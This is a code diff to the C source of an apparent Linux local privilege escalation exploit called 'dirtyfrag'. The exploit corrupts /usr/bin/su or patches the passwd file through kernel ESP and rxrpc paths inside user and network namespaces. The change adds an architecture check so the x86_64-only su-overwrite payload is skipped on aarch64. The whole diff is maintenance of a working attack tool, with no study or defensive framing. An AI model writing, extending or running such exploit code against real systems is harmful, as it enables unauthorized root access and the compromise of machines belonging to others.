@@ -289,6 +289,8 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 	return got == want ? 0 : -1;
 }
 
+static int runtime_is_aarch64(void);
+
 static int corrupt_su(void)
 {
 	setup_userns_netns();
@@ -325,6 +327,11 @@ static int corrupt_su(void)
 
 int su_lpe_main(int argc, char **argv)
 {
+	if (runtime_is_aarch64()) {
+		SLOG("skipping ESP /usr/bin/su overwrite on aarch64 (x86_64 payload only)");
+		errno = ENOTSUP;
+		return 1;
+	}
 	for (int i = 1; i < argc; i++) {
 		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
 			g_su_verbose = 1;
@@ -1937,14 +1944,17 @@ int main(int argc, char **argv)
 		for (int i = 0; !passwd_already_patched() && i < 3; i++)
 			rc = rxrpc_lpe_main(new_argc, co_argv);
 	} else if (force_esp) {
-		rc = su_lpe_main(new_argc, co_argv);
+		if (is_aarch64) {
+			dprintf(2, "dirtyfrag: --force-esp is unsupported on aarch64 (x86_64 payload only)\n");
+			rc = 1;
+		} else {
+			rc = su_lpe_main(new_argc, co_argv);
+		}
 	} else {
 		if (is_aarch64) {
 			rc = rxrpc_lpe_main(new_argc, co_argv);
 			for (int i = 0; !passwd_already_patched() && i < 3; i++)
 				rc = rxrpc_lpe_main(new_argc, co_argv);
-			if (!passwd_already_patched())
-				rc = su_lpe_main(new_argc, co_argv);
 		} else {
 			rc = su_lpe_main(new_argc, co_argv);
 			if (!su_already_patched()) {
